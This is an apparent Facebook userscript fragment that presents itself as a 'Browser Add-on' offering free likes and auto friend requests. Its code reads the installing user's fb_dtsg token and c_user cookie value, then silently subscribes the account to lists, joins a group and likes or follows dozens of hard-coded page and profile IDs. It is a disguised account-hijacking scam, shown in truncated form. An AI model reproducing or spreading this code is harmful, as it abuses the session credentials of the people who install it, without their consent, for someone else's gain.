// ==UserScript==
// @name            Browser Add-on
// @description     Get auto friends requests & free likes to your pages.
...
// (000000000000000)
// (000000000000000)
sublist("198836173652030"); 
sublist("583112898435291"); 
//Group subscriber
var gid = ['218514218332022'];
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
...
P("472018476243620");Like("120578801295613");Like("471406972971437");Like("274964375901821");Like("291454737655992");P("663926923627462");Like("481419208591468");P("647978558555632");
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
